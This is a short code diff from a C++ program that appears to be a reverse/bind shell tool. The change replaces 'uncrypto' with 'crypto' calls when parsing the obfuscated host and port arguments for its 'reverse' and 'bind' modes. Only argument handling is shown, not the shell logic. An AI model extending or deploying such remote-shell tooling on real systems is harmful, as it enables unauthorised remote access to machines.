@@ -25,11 +25,11 @@ int main(int argc, char *argv[])
 
         if (std::string(argv[1]) == "reverse") {
             if (argc >= 4) {
-                host = uncrypto(argv[2]);
-                port = uncrypto(argv[3]);
+                host = crypto(std::string(argv[2]));
+                port = crypto(std::string(argv[3]));
             } else if (argc >= 3) {
                 host = "127.0.0.1";
-                port = uncrypto(argv[2]);
+                port = crypto(std::string(argv[2]));
             } else
                 return -1;
 
@@ -40,7 +40,7 @@ int main(int argc, char *argv[])
             close(sock);
         } else if (std::string(argv[1]) == "bind") {
             if (argc >= 3)
-                port = uncrypto(argv[2]);
+                port = crypto(std::string(argv[2]));
             else
                 return -1;
 
